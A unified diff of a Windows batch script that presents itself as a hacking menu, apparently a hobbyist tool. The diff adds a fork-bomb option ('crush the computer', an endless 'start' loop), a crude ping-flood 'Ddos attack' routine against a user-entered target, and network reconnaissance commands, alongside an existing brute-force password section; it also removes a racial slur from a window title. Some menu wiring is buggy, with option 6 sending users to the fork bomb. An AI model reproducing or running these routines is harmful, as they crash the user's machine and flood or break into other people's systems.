@@ -26,6 +26,9 @@ color A
 echo 1) your network info
 echo 2) know what the network password is  
 echo 3) brute force attack on a computer
+echo 4) Devices info
+echo 5) crush the computer
+echo 6) crush a targeted computer -- Ddos attack
 set /p op="Please choose a command: "
 
 if "%op%"=="1" (
@@ -37,6 +40,21 @@ if "%op%"=="2" (
 )
 if "%op%"=="3" (
     goto :c
+)
+if "%op%"=="4" (
+    goto :d
+)
+if "%op%"=="5" (
+    goto :e
+)
+if "%op%"=="6" (
+    goto :e
+)
+if not "%op%"=="1" if not "%op%"=="2" if not "%op%"=="3"if not "%op%"=="4"if not "%op%"=="5"if not "%op%"=="6" (
+	cls
+	echo Please enter a good number
+	timeout 3
+    goto :start
 )
 
 :b
@@ -107,24 +125,13 @@ echo.
 echo.
 echo.
 
-
-set /p po="wanna go back? (y/n)"
-
-if /I "%po%" EQU "y" (
-	
-    goto :start
-)
-goto :a
-
-if /I "%po%" EQU "n" (
-    goto :a
-)
-
 pause
+goto :start
+
+
 
 :c
 cls
-title The Nigger - Brute Force
 color A
 echo.
 setlocal enabledelayedexpansion
@@ -164,3 +171,47 @@ if %errorlevel% EQU 0 goto success
 :: הצגת הודעה אם החיבור נכשל
 echo [Attempt %count%] : [!pass!]
 set /a count=%count%+1
+
+
+
+:d
+cls
+color 4
+echo.
+echo.
+echo.
+echo ----------------
+route print | findstr /C:"Interface List" /C:"......"
+
+echo -----------------
+arp -a
+echo -----------------
+pause
+goto :start
+
+
+:e
+cls
+color 4
+set /p name="Are you sure?????(y/n)"
+if /I "%name%" == "y" (
+    goto :loop
+)
+if /I "%name%" == "n" (
+    
+    goto :start
+)
+
+
+:loop
+start
+goto :loop
+
+:f
+set /p target="Enter target IP or domain: "
+color 4
+
+for /l %%i in (1,1,100000000000000000000000000000000000000000000000000000000000000000) do (
+    ping -n 1 %target% >nul
+    echo Sent packet %%i to %target%
+)
